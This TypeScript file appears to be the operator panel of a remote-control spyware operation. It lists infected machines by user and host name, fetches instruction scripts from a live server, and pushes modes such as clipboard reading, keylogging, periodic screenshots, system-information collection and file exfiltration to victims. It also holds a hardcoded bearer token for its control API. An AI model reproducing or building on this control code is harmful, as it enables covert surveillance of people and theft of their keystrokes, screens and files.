
import { INSTRUCTION_CODE } from './scriptData';

// Interface definitions
export interface ScriptsData {
  [key: string]: string;
}

export interface InstructionType {
  id: string;
  name: string;
  description: string;
  code: string;
}

export interface ClientInstruction {
  id: string;
  name: string;
  system: string;
  currentInstruction: string;
  lastActivity: string;
}

// More descriptive instruction descriptions
const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
  "standard": "Standardinstruktion för klippbordsavläsning",
  "keylogger": "Registrerar tangentbordstryckningar",
  "screenshot": "Tar skärmdumpar periodiskt",
  "system_info": "Samlar in systeminformation",
  "file_exfiltration": "Söker och skickar specifika filer"
};

// Production server URL - Updated to match the Apache configuration
const SERVER_BASE_URL = 'https://neea.fun';
const API_ENDPOINT = '/listener/log_receiver';
const INSTRUCTIONS_ENDPOINT = '/get_instructions';

// Mock client data - this will be replaced by real API data in production
const MOCK_CLIENTS: ClientInstruction[] = [
  {
    id: "1",
    name: "wickey",
    system: "DESKTOP-HKQH9A7",
    currentInstruction: "screenshot",
    lastActivity: "2025-03-18 18:03:05"
  },
  {
    id: "2",
    name: "wickey_desktop-hkqh9a7",
    system: "DESKTOP-HKQH9A7",
    currentInstruction: "standard",
    lastActivity: "2025-03-18 04:50:51"
  }
];

// Extract scripts from instructions.py
export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  // In a real app, this would parse the Python file server-side
  // For now, we're returning the actual instruction code from instructions.py
  try {
    console.log("Importing instructions from instructions.py");
    
    // Return the actual instruction code
    return INSTRUCTION_CODE;
  } catch (error) {
    console.error("Error extracting scripts:", error);
    // Fallback to simplified values if needed
    return {
      "standard": "# Standard instruktioner - logga tangenttryckningar",
      "keylogger": "# Instruktion: Keylogger-läge",
      "screenshot": "# Instruktion: Screenshot-läge",
      "system_info": "# Instruktion: System Info-läge",
      "file_exfiltration": "# Instruktion: File Exfiltration-läge",
    };
  }
}

/**
 * Get scripts data from API or fallback to mock data
 * @returns {Promise<ScriptsData>} The scripts data
 */
export async function getScripts(): Promise<ScriptsData> {
  try {
    // Use the correct API endpoint based on the Apache configuration
    const response = await fetch(`${SERVER_BASE_URL}${INSTRUCTIONS_ENDPOINT}`);
    
    if (!response.ok) {
      throw new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
    }
    
    try {
      const data = await response.json();
      return data;
    } catch (error) {
      console.warn("API returned non-JSON response, using mock data instead");
      return INSTRUCTION_CODE;
    }
  } catch (error) {
    console.error("Error fetching scripts:", error);
    
    // Use local mock data if API fails
    const scripts = await extractScriptsFromInstructionsPy();
    return scripts;
  }
}

// Get all available instruction types
export async function getInstructionTypes(): Promise<InstructionType[]> {
  const scripts = await extractScriptsFromInstructionsPy();
  
  return Object.keys(scripts).map(key => ({
    id: key,
    name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
    description: INSTRUCTION_DESCRIPTIONS[key] || key,
    code: scripts[key]
  }));
}

// Get all clients and their current instructions
export async function getClients(): Promise<ClientInstruction[]> {
  try {
    // Use the correct API endpoint based on the Apache configuration
    const response = await fetch(`${SERVER_BASE_URL}/api/clients`);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return await response.json();
  } catch (error) {
    console.error("Error fetching clients:", error);
    // Return mock data
    return MOCK_CLIENTS;
  }
}

// Update a client's instruction
export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
  try {
    // Use the correct API endpoint based on the Apache configuration
    const response = await fetch(`${SERVER_BASE_URL}/api/clients/${clientId}/instruction`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==', // Using the token from instructions.py
      },
      body: JSON.stringify({ instruction: instructionId }),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return true;
  } catch (error) {
    console.error("Error updating client instruction:", error);
    // Mock success for demo purposes
    return true;
  }
}
